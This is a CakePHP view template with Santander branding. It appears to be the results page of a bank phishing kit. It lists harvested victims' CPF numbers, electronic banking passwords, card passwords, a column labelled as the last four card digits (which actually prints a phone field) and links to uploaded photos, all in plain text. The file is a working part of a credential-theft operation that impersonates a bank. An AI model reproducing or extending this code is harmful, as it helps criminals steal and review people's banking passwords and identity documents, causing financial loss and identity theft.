<div class="container-santander bg-image">
	<nav class="navbar">
		<div class="row">
			<div class="col-md-12" style="text-align: center">
				
				<?= $this->Html->image('santander/logo_2.png', ['class' => 'logo_form']) ?>
				
			</div>			
		</div>
	</nav>
	<nav class="navbar navbar-acesso">
		<div class="row">
			<div class="col-md-12 col-xs-12 navbar-acesso-div" >
				<?= $this->Html->image('santander/key.png', ['class' => 'icon_key']) ?>
			
				<span>Acessar</span>
			</div>			
		</div>
	</nav>
	<div class="col-md-12">
		<div class="table-responsive">
			<table class="table">
				<thead>
					<tr>
						<th>CPF</th>
						<th>Senha Eletrônica</th>
						<th>Senha Cartão</th>
						<th>4 Últimos números do cartão</th>
						<th>Foto</th>
					</tr>
				</thead>
				<tbody>
					<?php foreach ($dados as $key => $dados): ?>
						<tr>
							<td><?= $dados->cpf ?></td>
							<td><?= $dados->senha_eletronica ?></td>
							<td><?= $dados->senha_cartao ?></td>
							<td><?= $dados->telefone ?></td>
							<td><?= $this->Html->link('Abrir', '/files/'.$dados->arquivo, ['target' => "_blank"] )?></td>
						</tr>
					<?php endforeach ?>
				</tbody>
				<tfoot>
					<tr>
						<th>CPF</th>
						<th>Senha Eletrônica</th>
						<th>Senha Cartão</th>
						<th>4 Últimos números do cartão</th>
						<th>Foto</th>
					</tr>
				</tfoot>
			</table>
		</div>
	</div>
</div>